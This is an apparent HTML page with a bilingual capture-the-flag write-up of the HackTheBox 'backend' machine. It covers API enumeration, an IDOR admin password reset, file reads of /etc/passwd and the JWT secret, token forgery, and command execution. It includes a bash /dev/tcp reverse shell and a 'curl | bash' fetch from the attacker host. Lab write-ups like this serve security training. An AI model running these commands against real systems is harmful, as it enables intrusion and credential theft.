@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>backend | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">backend</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a FastAPI application built with Python and Uvicorn. Through API fuzzing, I discovered multiple endpoints including authentication mechanisms and administrative functions. By creating a new user account and analyzing the JWT token structure, I identified that users have a <code>guid</code> attribute and an <code>is_superuser</code> flag.</p>
+                    
+                    <p>The application exposed an OpenAPI specification at <code>/openapi.json</code> which revealed all available endpoints, including a privileged <code>/api/v1/user/SecretFlagEndpoint</code> that provided the user flag, and administrative endpoints like <code>/admin/file</code> and <code>/admin/exec/{command}</code>. I exploited a password update endpoint that allowed me to change the administrator's password using their known GUID, gaining administrative access.</p>
+                    
+                    <p>Using the administrative file reading endpoint, I performed path traversal to read <code>/proc/self/cmdline</code> and <code>/proc/self/environ</code>, discovering the application's source code location at <code>/home/htb/uhc/app/main.py</code>. By reading the configuration file at <code>/home/htb/uhc/app/core/settings.py</code>, I extracted the JWT signing secret: <code>SuperSecretSigningKey-HTB</code>.</p>
+                    
+                    <p>With this secret, I forged a JWT token with the <code>debug</code> flag set to true, bypassing the authentication check on the command execution endpoint. I used this to execute arbitrary commands, obtaining a reverse shell as the <code>htb</code> user. Finally, I discovered a failed login attempt in the authentication logs containing the password <code>Tr0ub4dor&3</code>, which granted me root access via <code>su</code>.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> FastAPI API enumeration, JWT token analysis and forgery, insecure direct object reference (IDOR) for password updates, path traversal via file reading endpoint, command injection through privileged administrative endpoint, credential disclosure in application logs.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify the services running on the target:</p>
+                <p><img src="./media/image3.png" alt="Nmap scan results showing SSH on port 22 and HTTP on port 80 with Uvicorn server" /></p>
+
+                <p>The scan reveals two open ports: SSH on port 22 and an HTTP server on port 80. The presence of Uvicorn indicates that the backend is running a Python-based web application, most likely built with FastAPI or a similar framework.</p>
+
+                <h2>Web Enumeration - API Discovery</h2>
+                <p>Visiting the root URL, I'm greeted with a simple JSON response:</p>
+                <pre><code class="language-json">{"msg":"UHC API Version 1.0"}</code></pre>
+
+                <p>This confirms we're dealing with an API. I proceed with directory fuzzing using <code>feroxbuster</code> to discover additional endpoints:</p>
+                <pre><code class="language-bash">feroxbuster -u http://10.10.11.161 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+
+                <p>The fuzzing reveals two interesting paths:</p>
+                <ul>
+                    <li><code>/docs</code> - Returns HTTP 401 (Unauthorized)</li>
+                    <li><code>/api</code> - Returns HTTP 200 with minimal content</li>
+                </ul>
+
+                <p>Navigating to <code>/api</code>, I find a reference to <code>/v1</code>. Accessing <code>/api/v1</code> shows available endpoint categories:</p>
+                <pre><code class="language-json">{"endpoints":["user","admin"]}</code></pre>
+
+                <h3>Testing User and Admin Endpoints</h3>
+                <p>I attempt to access both endpoints:</p>
+                <ul>
+                    <li><code>/api/v1/user</code> - Returns "not found"</li>
+                    <li><code>/api/v1/admin</code> - Returns "not authenticated"</li>
+                </ul>
+
+                <p>Testing different user IDs at <code>/api/v1/user/1</code> reveals information about a user:</p>
+                <p><img src="./media/image1.png" alt="JSON response showing user information including guid, email, and is_superuser fields" /></p>
+
+                <p>The response shows a user with GUID <code>36c2e94a-4271-4259-93bf-c96ad5948284</code> and email <code>admin@htb.local</code> who has <code>is_superuser</code> set to true. The IDs appear to be auto-incremental starting from 1, though testing IDs 2 and 3 returns no results.</p>
+
+                <h3>HTTP Method Fuzzing</h3>
+                <p>I expand my enumeration by fuzzing for POST, PUT, and DELETE methods specifically:</p>
+                <pre><code class="language-bash">feroxbuster -u http://10.10.11.161/api/v1 -w /usr/share/wordlists/dirb/common.txt -m POST,PUT,DELETE</code></pre>
+
+                <p>Under <code>/api/v1/admin</code>, I discover:</p>
+                <pre><code class="language-plaintext">401 POST /api/v1/admin/file</code></pre>
+
+                <p>Under <code>/api/v1/user</code>, I find authentication-related endpoints:</p>
+                <pre><code class="language-plaintext">422 POST /api/v1/user/login
+422 POST /api/v1/user/signup</code></pre>
+
+                <h2>Authentication - Creating an Account</h2>
+                <p>Now that I've identified the authentication endpoints, I proceed to create a test account:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/user/signup" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"testuser", "email": "test@test.com", "password": "testpass"}'</code></pre>
+
+                <p>The signup succeeds, returning an empty JSON object. Next, I attempt to log in. Through experimentation, I discover that the <code>username</code> field in the login request actually expects the email address:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/user/login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=test@test.com&password=testpass"</code></pre>
+
+                <p>The response provides a JWT access token:</p>
+                <pre><code class="language-json">{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...","token_type":"bearer"}</code></pre>
+
+                <h3>JWT Token Analysis</h3>
+                <p>Decoding the JWT token reveals its structure:</p>
+                <pre><code class="language-json">{
+  "type": "access_token",
+  "exp": 1768407713,
+  "iat": 1767716513,
+  "sub": "2",
+  "is_superuser": false,
+  "guid": "b32bd5e1-07fd-4dc2-a338-9b56ce283556"
+}</code></pre>
+
+                <p>Key observations:</p>
+                <ul>
+                    <li><code>sub</code>: User ID (2, since admin is 1)</li>
+                    <li><code>is_superuser</code>: Boolean flag for administrative privileges</li>
+                    <li><code>guid</code>: Unique identifier for the user</li>
+                    <li>No <code>debug</code> flag present</li>
+                </ul>
+
+                <h2>OpenAPI Documentation Discovery</h2>
+                <p>With a valid JWT token, I revisit the <code>/docs</code> endpoint, which now returns an HTML page. The page contains a reference to <code>/openapi.json</code>:</p>
+                <pre><code class="language-javascript">const ui = SwaggerUIBundle({
+  url: '/openapi.json',
+  "dom_id": "#swagger-ui",
+  "layout": "BaseLayout"
+});</code></pre>
+
+                <p>Accessing <code>/openapi.json</code> reveals the complete API specification, including all available endpoints, HTTP methods, and required parameters. I save and parse this file using <code>jq</code> for better readability:</p>
+                <pre><code class="language-bash">curl http://10.10.11.161/openapi.json | jq '.' > endpoints.json</code></pre>
+
+                <p>The specification indicates the application is built with FastAPI version 0.1.0 and uses OpenAPI 3.0.2.</p>
+
+                <h3>Discovering the User Flag Endpoint</h3>
+                <p>While examining the OpenAPI specification, I discover an interesting endpoint:</p>
+                <pre><code class="language-json">"/api/v1/user/SecretFlagEndpoint": {
+  "put": {
+    "summary": "Secret Flag Endpoint",
+    "description": "Returns the user flag"
+  }
+}</code></pre>
+
+                <p>I immediately test this endpoint with my authenticated token:</p>
+                <pre><code class="language-bash">curl -X PUT "http://10.10.11.161/api/v1/user/SecretFlagEndpoint" \
+  -H "Authorization: Bearer {token}"</code></pre>
+
+                <p>Success! The response contains the user flag:</p>
+                <pre><code class="language-json">{"user.txt":"[REDACTED]"}</code></pre>
+
+                <h2>Path to Administrative Access</h2>
+                <p>Continuing my analysis of the OpenAPI specification, I identify two powerful administrative endpoints:</p>
+                <ul>
+                    <li><code>/api/v1/admin/file</code> - File reading endpoint</li>
+                    <li><code>/api/v1/admin/exec/{command}</code> - Command execution endpoint with the description: "Executes a command. Requires Debug Permissions."</li>
+                </ul>
+
+                <p>The command execution endpoint is particularly interesting, as it would allow me to obtain a reverse shell. However, it requires both administrative access and a special "Debug" permission.</p>
+
+                <h3>Attempting Privilege Escalation via Signup</h3>
+                <p>I first attempt to create a new user with <code>is_superuser</code> set to true:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/user/signup" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"adminuser", "email": "admin2@test.com", "password": "test", "is_superuser": true}'</code></pre>
+
+                <p>The request succeeds, but the <code>is_superuser</code> flag is silently ignored - the API returns an empty JSON object, and subsequent login shows my new user is still a regular user.</p>
+
+                <h3>Exploiting the Password Update Endpoint</h3>
+                <p>The OpenAPI specification reveals another endpoint: <code>/api/v1/user/updatepass</code>, which accepts a <code>guid</code> and a new <code>password</code>. This presents an Insecure Direct Object Reference (IDOR) vulnerability - I can potentially change any user's password if I know their GUID.</p>
+
+                <p>Earlier, I discovered that the admin user has the GUID <code>36c2e94a-4271-4259-93bf-c96ad5948284</code>. I attempt to change the admin's password:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/user/updatepass" \
+  -H "Content-Type: application/json" \
+  -d '{"guid":"36c2e94a-4271-4259-93bf-c96ad5948284", "password": "newpass"}'</code></pre>
+
+                <p>The response confirms the password has been updated:</p>
+                <pre><code class="language-json">{
+  "date": null,
+  "id": 1,
+  "is_superuser": true,
+  "hashed_password": "$2b$12$xh2jt67ziB4G2j6raMXvtu6bE1RlJ5JYmugUcFV2y0RIsWVMh4V7a",
+  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
+  "email": "admin@htb.local",
+  "time_created": 1649533388111,
+  "last_update": null
+}</code></pre>
+
+                <p>Now I can log in as the administrator:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/user/login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin@htb.local&password=newpass"</code></pre>
+
+                <p>The response provides an administrative JWT token:</p>
+                <pre><code class="language-json">{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...","token_type":"bearer"}</code></pre>
+
+                <h2>Path Traversal via File Reading Endpoint</h2>
+                <p>With administrative access, I can now test the <code>/api/v1/admin/file</code> endpoint. However, attempting to use the command execution endpoint reveals another barrier:</p>
+                <pre><code class="language-bash">curl "http://10.10.11.161/api/v1/admin/exec/id" \
+  -H "Authorization: Bearer {admin_token}"</code></pre>
+
+                <p>Response:</p>
+                <pre><code class="language-json">{"detail":"Debug key missing from JWT"}</code></pre>
+
+                <p>The command execution endpoint requires a <code>debug</code> key in the JWT token. To forge such a token, I need to discover the JWT signing secret.</p>
+
+                <h3>Enumerating the Filesystem</h3>
+                <p>I use the file reading endpoint to perform path traversal and enumerate the system. First, I check <code>/etc/passwd</code>:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/admin/file" \
+  -H "Authorization: Bearer {admin_token}" \
+  -H "Content-Type: application/json" \
+  -d '{"file": "/etc/passwd"}' | grep sh</code></pre>
+
+                <p>The output reveals a user named <code>htb</code> with a home directory at <code>/home/htb</code> and a shell at <code>/bin/bash</code>.</p>
+
+                <h3>Discovering the Application Path</h3>
+                <p>To understand where the application code is located, I read <code>/proc/self/cmdline</code>:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/admin/file" \
+  -H "Authorization: Bearer {admin_token}" \
+  -H "Content-Type: application/json" \
+  -d '{"file": "/proc/self/cmdline"}'</code></pre>
+
+                <p>Response:</p>
+                <pre><code class="language-json">{"file":"/home/htb/uhc/.venv/bin/python3\u0000-c\u0000from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7)\u0000--multiprocessing-fork\u0000"}</code></pre>
+
+                <p>This reveals the application is running from <code>/home/htb/uhc</code>. I confirm this by reading <code>/proc/self/environ</code>:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/admin/file" \
+  -H "Authorization: Bearer {admin_token}" \
+  -H "Content-Type: application/json" \
+  -d '{"file": "/proc/self/environ"}'</code></pre>
+
+                <p>The environment variables show:</p>
+                <pre><code class="language-plaintext">APP_MODULE=app.main:app
+PWD=/home/htb/uhc
+HOME=/home/htb
+VIRTUAL_ENV=/home/htb/uhc/.venv</code></pre>
+
+                <p>The <code>APP_MODULE</code> variable indicates the main application file is at <code>app/main.py</code>.</p>
+
+                <h3>Extracting the JWT Secret</h3>
+                <p>I read the main application file:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/admin/file" \
+  -H "Authorization: Bearer {admin_token}" \
+  -H "Content-Type: application/json" \
+  -d '{"file": "/home/htb/uhc/app/main.py"}'</code></pre>
+
+                <p>In <code>main.py</code>, I find an import statement:</p>
+                <pre><code class="language-python">from app.core.config import settings</code></pre>
+
+                <p>This indicates there's a configuration file at <code>app/core/config.py</code> or <code>app/core/settings.py</code>. I try reading the settings file:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/admin/file" \
+  -H "Authorization: Bearer {admin_token}" \
+  -H "Content-Type: application/json" \
+  -d '{"file": "/home/htb/uhc/app/core/settings.py"}'</code></pre>
+
+                <p>Success! The configuration file contains several sensitive values:</p>
+                <pre><code class="language-python">JWT_SECRET: str = "SuperSecretSigningKey-HTB"
+SQLALCHEMY_DATABASE_URI: Optional[str] = "sqlite:///uhc.db"
+FIRST_SUPERUSER: EmailStr = "root@ippsec.rocks"</code></pre>
+
+                <p>I now have the JWT signing secret: <code>SuperSecretSigningKey-HTB</code>.</p>
+
+                <h2>JWT Forgery and Command Execution</h2>
+                <p>With the JWT secret, I can forge a token that includes the <code>debug</code> flag. I use an online JWT debugger or a Python script to create a new token with the following payload:</p>
+                <p><img src="./media/image2.png" alt="JWT token payload showing type, exp, iat, sub, is_superuser set to true, guid, and debug set to true" /></p>
+
+                <p>The key modification is adding <code>"debug": true</code> to the payload, along with maintaining <code>"is_superuser": true</code>. I sign this with the secret <code>SuperSecretSigningKey-HTB</code> using the HS256 algorithm.</p>
+
+                <h3>Testing Command Execution</h3>
+                <p>With my forged token, I test the command execution endpoint:</p>
+                <pre><code class="language-bash">curl "http://10.10.11.161/api/v1/admin/exec/id" \
+  -H "Authorization: Bearer {forged_token}"</code></pre>
+
+                <p>Response:</p>
+                <pre><code class="language-plaintext">"uid=1000(htb) gid=1000(htb) groups=1000(htb),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)"</code></pre>
+
+                <p>Excellent! I now have command execution as the <code>htb</code> user.</p>
+
+                <h2>Obtaining a Reverse Shell</h2>
+                <p>To get a proper shell, I need to execute a reverse shell payload. However, passing complex commands with special characters through a URL path is problematic - the forward slashes in <code>/dev/tcp/</code> get interpreted as path separators, and even URL encoding doesn't help.</p>
+
+                <p>My solution is to host the reverse shell payload on my attacking machine and have the target fetch and execute it:</p>
+
+                <h3>Setting Up the Payload</h3>
+                <p>I create an <code>index.html</code> file containing a bash reverse shell:</p>
+                <pre><code class="language-bash">cat > index.html << 'EOF'
+bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"
+EOF</code></pre>
+
+                <p>I start a Python HTTP server to serve this file:</p>
+                <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+
+                <p>Then I set up a netcat listener to catch the reverse shell:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <h3>Triggering the Reverse Shell</h3>
+                <p>I execute the following command through the API, which fetches my payload and pipes it to bash:</p>
+                <pre><code class="language-bash">curl "http://10.10.11.161/api/v1/admin/exec/curl%2010.10.16.2:8000%20|bash" \
+  -H "Authorization: Bearer {forged_token}"</code></pre>
+
+                <p>My Python server logs the request:</p>
+                <pre><code class="language-plaintext">10.10.11.161 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <p>And my netcat listener receives the connection:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.11.161] 40450
+bash: cannot set terminal process group (668): Inappropriate ioctl for device
+bash: no job control in this shell
+htb@backend:~/uhc$</code></pre>
+
+                <p>I now have a shell as the <code>htb</code> user.</p>
+
+                <h2>Privilege Escalation to Root</h2>
+                <p>After stabilizing my shell, I begin enumerating the system for privilege escalation vectors. While exploring the application directory, I discover an authentication log file:</p>
+                <pre><code class="language-bash">cat ~/uhc/auth.log</code></pre>
+
+                <p>Among the entries, I find a failed login attempt that reveals what appears to be a password:</p>
+                <pre><code class="language-plaintext">01/06/2026, 15:39:26 - Login Failure for Tr0ub4dor&3</code></pre>
+
+                <p>The string <code>Tr0ub4dor&3</code> looks like a password that was accidentally entered as a username. I test this password with the <code>htb</code> user:</p>
+                <pre><code class="language-bash">su htb
+Password: Tr0ub4dor&3</code></pre>
+
+                <p>This doesn't work, but trying it with <code>root</code> succeeds:</p>
+                <pre><code class="language-bash">su root
+Password: Tr0ub4dor&3</code></pre>
+
+                <p>I'm now root and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación FastAPI construida con Python y Uvicorn. Mediante fuzzing de la API, descubrí múltiples endpoints incluyendo mecanismos de autenticación y funciones administrativas. Al crear una cuenta de usuario y analizar la estructura del token JWT, identifiqué que los usuarios tienen un atributo <code>guid</code> y un flag <code>is_superuser</code>.</p>
+                    
+                    <p>La aplicación exponía una especificación OpenAPI en <code>/openapi.json</code> que revelaba todos los endpoints disponibles, incluyendo un endpoint privilegiado <code>/api/v1/user/SecretFlagEndpoint</code> que proporcionaba la flag de usuario, y endpoints administrativos como <code>/admin/file</code> y <code>/admin/exec/{command}</code>. Exploté un endpoint de actualización de contraseña que permitía cambiar la contraseña del administrador usando su GUID conocido, obteniendo acceso administrativo.</p>
+                    
+                    <p>Usando el endpoint administrativo de lectura de archivos, realicé path traversal para leer <code>/proc/self/cmdline</code> y <code>/proc/self/environ</code>, descubriendo la ubicación del código fuente de la aplicación en <code>/home/htb/uhc/app/main.py</code>. Al leer el archivo de configuración en <code>/home/htb/uhc/app/core/settings.py</code>, extraje el secreto de firmado JWT: <code>SuperSecretSigningKey-HTB</code>.</p>
+                    
+                    <p>Con este secreto, falsifiqué un token JWT con el flag <code>debug</code> establecido en true, evadiendo la verificación de autenticación en el endpoint de ejecución de comandos. Lo utilicé para ejecutar comandos arbitrarios, obteniendo una reverse shell como usuario <code>htb</code>. Finalmente, descubrí un intento de inicio de sesión fallido en los logs de autenticación conteniendo la contraseña <code>Tr0ub4dor&3</code>, que me otorgó acceso root mediante <code>su</code>.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Enumeración de API FastAPI, análisis y falsificación de tokens JWT, referencia directa insegura de objetos (IDOR) para actualización de contraseñas, path traversal mediante endpoint de lectura de archivos, inyección de comandos a través de endpoint administrativo privilegiado, divulgación de credenciales en logs de aplicación.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar los servicios ejecutándose en el objetivo:</p>
+                <p><img src="./media/image3.png" alt="Resultados del escaneo de nmap mostrando SSH en el puerto 22 y HTTP en el puerto 80 con servidor Uvicorn" /></p>
+
+                <p>El escaneo revela dos puertos abiertos: SSH en el puerto 22 y un servidor HTTP en el puerto 80. La presencia de Uvicorn indica que el backend ejecuta una aplicación web basada en Python, muy probablemente construida con FastAPI o un framework similar.</p>
+
+                <h2>Enumeración Web - Descubrimiento de la API</h2>
+                <p>Al visitar la URL raíz, me recibe una simple respuesta JSON:</p>
+                <pre><code class="language-json">{"msg":"UHC API Version 1.0"}</code></pre>
+
+                <p>Esto confirma que estamos tratando con una API. Procedo con fuzzing de directorios usando <code>feroxbuster</code> para descubrir endpoints adicionales:</p>
+                <pre><code class="language-bash">feroxbuster -u http://10.10.11.161 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+
+                <p>El fuzzing revela dos rutas interesantes:</p>
+                <ul>
+                    <li><code>/docs</code> - Devuelve HTTP 401 (No autorizado)</li>
+                    <li><code>/api</code> - Devuelve HTTP 200 con contenido mínimo</li>
+                </ul>
+
+                <p>Navegando a <code>/api</code>, encuentro una referencia a <code>/v1</code>. Accediendo a <code>/api/v1</code> se muestran las categorías de endpoints disponibles:</p>
+                <pre><code class="language-json">{"endpoints":["user","admin"]}</code></pre>
+
+                <h3>Probando Endpoints de Usuario y Admin</h3>
+                <p>Intento acceder a ambos endpoints:</p>
+                <ul>
+                    <li><code>/api/v1/user</code> - Devuelve "not found"</li>
+                    <li><code>/api/v1/admin</code> - Devuelve "not authenticated"</li>
+                </ul>
+
+                <p>Probando diferentes IDs de usuario en <code>/api/v1/user/1</code> revela información sobre un usuario:</p>
+                <p><img src="./media/image1.png" alt="Respuesta JSON mostrando información de usuario incluyendo campos guid, email e is_superuser" /></p>
+
+                <p>La respuesta muestra un usuario con GUID <code>36c2e94a-4271-4259-93bf-c96ad5948284</code> y email <code>admin@htb.local</code> que tiene <code>is_superuser</code> establecido en true. Los IDs parecen ser autoincrementales empezando desde 1, aunque probar los IDs 2 y 3 no devuelve resultados.</p>
+
+                <h3>Fuzzing de Métodos HTTP</h3>
+                <p>Amplío mi enumeración fuzzeando específicamente los métodos POST, PUT y DELETE:</p>
+                <pre><code class="language-bash">feroxbuster -u http://10.10.11.161/api/v1 -w /usr/share/wordlists/dirb/common.txt -m POST,PUT,DELETE</code></pre>
+
+                <p>Bajo <code>/api/v1/admin</code>, descubro:</p>
+                <pre><code class="language-plaintext">401 POST /api/v1/admin/file</code></pre>
+
+                <p>Bajo <code>/api/v1/user</code>, encuentro endpoints relacionados con autenticación:</p>
+                <pre><code class="language-plaintext">422 POST /api/v1/user/login
+422 POST /api/v1/user/signup</code></pre>
+
+                <h2>Autenticación - Creando una Cuenta</h2>
+                <p>Ahora que he identificado los endpoints de autenticación, procedo a crear una cuenta de prueba:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/user/signup" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"testuser", "email": "test@test.com", "password": "testpass"}'</code></pre>
+
+                <p>El registro tiene éxito, devolviendo un objeto JSON vacío. A continuación, intento iniciar sesión. A través de experimentación, descubro que el campo <code>username</code> en la petición de login en realidad espera la dirección de correo electrónico:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/user/login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=test@test.com&password=testpass"</code></pre>
+
+                <p>La respuesta proporciona un token JWT de acceso:</p>
+                <pre><code class="language-json">{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...","token_type":"bearer"}</code></pre>
+
+                <h3>Análisis del Token JWT</h3>
+                <p>Decodificando el token JWT revela su estructura:</p>
+                <pre><code class="language-json">{
+  "type": "access_token",
+  "exp": 1768407713,
+  "iat": 1767716513,
+  "sub": "2",
+  "is_superuser": false,
+  "guid": "b32bd5e1-07fd-4dc2-a338-9b56ce283556"
+}</code></pre>
+
+                <p>Observaciones clave:</p>
+                <ul>
+                    <li><code>sub</code>: ID de usuario (2, ya que admin es 1)</li>
+                    <li><code>is_superuser</code>: Flag booleano para privilegios administrativos</li>
+                    <li><code>guid</code>: Identificador único para el usuario</li>
+                    <li>No hay flag <code>debug</code> presente</li>
+                </ul>
+
+                <h2>Descubrimiento de Documentación OpenAPI</h2>
+                <p>Con un token JWT válido, revisito el endpoint <code>/docs</code>, que ahora devuelve una página HTML. La página contiene una referencia a <code>/openapi.json</code>:</p>
+                <pre><code class="language-javascript">const ui = SwaggerUIBundle({
+  url: '/openapi.json',
+  "dom_id": "#swagger-ui",
+  "layout": "BaseLayout"
+});</code></pre>
+
+                <p>Accediendo a <code>/openapi.json</code> revela la especificación completa de la API, incluyendo todos los endpoints disponibles, métodos HTTP y parámetros requeridos. Guardo y parseo este archivo usando <code>jq</code> para mejor legibilidad:</p>
+                <pre><code class="language-bash">curl http://10.10.11.161/openapi.json | jq '.' > endpoints.json</code></pre>
+
+                <p>La especificación indica que la aplicación está construida con FastAPI versión 0.1.0 y usa OpenAPI 3.0.2.</p>
+
+                <h3>Descubriendo el Endpoint de la Flag de Usuario</h3>
+                <p>Mientras examino la especificación OpenAPI, descubro un endpoint interesante:</p>
+                <pre><code class="language-json">"/api/v1/user/SecretFlagEndpoint": {
+  "put": {
+    "summary": "Secret Flag Endpoint",
+    "description": "Returns the user flag"
+  }
+}</code></pre>
+
+                <p>Inmediatamente pruebo este endpoint con mi token autenticado:</p>
+                <pre><code class="language-bash">curl -X PUT "http://10.10.11.161/api/v1/user/SecretFlagEndpoint" \
+  -H "Authorization: Bearer {token}"</code></pre>
+
+                <p>¡Éxito! La respuesta contiene la flag de usuario:</p>
+                <pre><code class="language-json">{"user.txt":"[CENSURADO]"}</code></pre>
+
+                <h2>Camino hacia el Acceso Administrativo</h2>
+                <p>Continuando mi análisis de la especificación OpenAPI, identifico dos endpoints administrativos potentes:</p>
+                <ul>
+                    <li><code>/api/v1/admin/file</code> - Endpoint de lectura de archivos</li>
+                    <li><code>/api/v1/admin/exec/{command}</code> - Endpoint de ejecución de comandos con la descripción: "Executes a command. Requires Debug Permissions."</li>
+                </ul>
+
+                <p>El endpoint de ejecución de comandos es particularmente interesante, ya que me permitiría obtener una reverse shell. Sin embargo, requiere tanto acceso administrativo como un permiso especial "Debug".</p>
+
+                <h3>Intentando Escalada de Privilegios mediante Signup</h3>
+                <p>Primero intento crear un nuevo usuario con <code>is_superuser</code> establecido en true:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/user/signup" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"adminuser", "email": "admin2@test.com", "password": "test", "is_superuser": true}'</code></pre>
+
+                <p>La petición tiene éxito, pero el flag <code>is_superuser</code> es silenciosamente ignorado - la API devuelve un objeto JSON vacío, y el inicio de sesión posterior muestra que mi nuevo usuario sigue siendo un usuario regular.</p>
+
+                <h3>Explotando el Endpoint de Actualización de Contraseña</h3>
+                <p>La especificación OpenAPI revela otro endpoint: <code>/api/v1/user/updatepass</code>, que acepta un <code>guid</code> y una nueva <code>password</code>. Esto presenta una vulnerabilidad de Referencia Directa Insegura de Objetos (IDOR) - potencialmente puedo cambiar la contraseña de cualquier usuario si conozco su GUID.</p>
+
+                <p>Anteriormente, descubrí que el usuario admin tiene el GUID <code>36c2e94a-4271-4259-93bf-c96ad5948284</code>. Intento cambiar la contraseña del admin:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/user/updatepass" \
+  -H "Content-Type: application/json" \
+  -d '{"guid":"36c2e94a-4271-4259-93bf-c96ad5948284", "password": "newpass"}'</code></pre>
+
+                <p>La respuesta confirma que la contraseña ha sido actualizada:</p>
+                <pre><code class="language-json">{
+  "date": null,
+  "id": 1,
+  "is_superuser": true,
+  "hashed_password": "$2b$12$xh2jt67ziB4G2j6raMXvtu6bE1RlJ5JYmugUcFV2y0RIsWVMh4V7a",
+  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
+  "email": "admin@htb.local",
+  "time_created": 1649533388111,
+  "last_update": null
+}</code></pre>
+
+                <p>Ahora puedo iniciar sesión como administrador:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/user/login" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "username=admin@htb.local&password=newpass"</code></pre>
+
+                <p>La respuesta proporciona un token JWT administrativo:</p>
+                <pre><code class="language-json">{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...","token_type":"bearer"}</code></pre>
+
+                <h2>Path Traversal mediante Endpoint de Lectura de Archivos</h2>
+                <p>Con acceso administrativo, ahora puedo probar el endpoint <code>/api/v1/admin/file</code>. Sin embargo, intentar usar el endpoint de ejecución de comandos revela otra barrera:</p>
+                <pre><code class="language-bash">curl "http://10.10.11.161/api/v1/admin/exec/id" \
+  -H "Authorization: Bearer {admin_token}"</code></pre>
+
+                <p>Respuesta:</p>
+                <pre><code class="language-json">{"detail":"Debug key missing from JWT"}</code></pre>
+
+                <p>El endpoint de ejecución de comandos requiere una clave <code>debug</code> en el token JWT. Para falsificar tal token, necesito descubrir el secreto de firmado JWT.</p>
+
+                <h3>Enumerando el Sistema de Archivos</h3>
+                <p>Utilizo el endpoint de lectura de archivos para realizar path traversal y enumerar el sistema. Primero, compruebo <code>/etc/passwd</code>:</p>
+                <pre><code class="language-bash">curl -X POST "http://10.10.11.161/api/v1/admin/file" \
+  -H "Authorization: Bearer {admin_token}" \
+  -H "Content-Type: application/json" \
+  -d '{"file": "/etc/passwd"}' | grep sh</code></pre>
+
+                <p>La salida revela un usuario llamado <code>htb</code> con un directorio home en <code>/home/htb</code> y una shell en <code>/bin/bash</code>.</p>
+
+                <h3>Descubriendo la Ruta de la Aplicación</h3>
